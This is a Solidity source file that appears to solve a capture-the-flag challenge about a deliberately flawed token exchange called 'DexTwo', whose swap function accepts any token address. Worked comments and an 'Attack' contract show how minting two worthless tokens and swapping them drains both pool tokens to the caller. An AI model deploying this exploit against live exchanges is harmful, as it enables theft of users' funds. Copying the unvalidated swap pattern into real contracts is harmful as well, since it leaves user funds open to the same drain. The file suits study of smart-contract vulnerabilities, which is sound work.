// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint fromAmount) public {
    require(IERC20(from).balanceOf(msg.sender) >= fromAmount, "Not enough to swap");
    uint toAmount = getSwapAmount(from, to, fromAmount);
    IERC20(from).transferFrom(msg.sender, address(this), fromAmount);
    IERC20(to).approve(address(this), toAmount);
    IERC20(to).transferFrom(address(this), msg.sender, toAmount);
  } 

  // amountA = amountB * (reserveA / reserveB)
  // amountB = amountA * (reserveB / reserveA)
  // x * (rA / rB) = 100
  // x = 100 * rB / rA
  // x = 100 * 100 / 100

  // Initial
  // A: 10, B: 10, C: 100, D: 100, rA: 100, rB: 100, rC: 100, rD: 100

  // = 1. Sell 100 C for A
  // 100 (C) * 100 (rA) / 100 (rC) = 100 (A)
  // A: 110 A, B: 10, C: 0, D: 100, rA: 0, rB: 100, rC: 200, rD: 100
  // 
  // = 2. Sell 100 D for B
  // 100 (D) * 100 (rB) / 100 (rD) = 100 (B)
  // A: 110 A, B: 110, C: 0, D: 0, rA: 0, rB: 0, rC: 200, rD: 200
  function getSwapAmount(address from, address to, uint fromAmount) public view returns(uint toAmount){
    return((fromAmount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract Attack {
    function attack(address _dex) external {
        DexTwo dex = DexTwo(_dex);

        dex.approve(_dex, 1000);

        SwappableTokenTwo tokenC = new SwappableTokenTwo(_dex, "", "", 200);
        SwappableTokenTwo tokenD = new SwappableTokenTwo(_dex, "", "", 200);

        tokenC.transfer(_dex, 100);
        tokenD.transfer(_dex, 100);

        tokenC.approve(_dex, 1000);
        tokenD.approve(_dex, 1000);

        address a = dex.token1();
        address b = dex.token2();

        // 1. Sell 100 C for 100 A
        dex.swap(address(tokenC), a, 100);
        // 2. Sell 100 D for 100 B
        dex.swap(address(tokenD), b, 100);

        IERC20 tokenA = IERC20(a);
        tokenA.transfer(msg.sender, tokenA.balanceOf(address(this)));
        IERC20 tokenB = IERC20(b);
        tokenB.transfer(msg.sender, tokenB.balanceOf(address(this)));
    }
}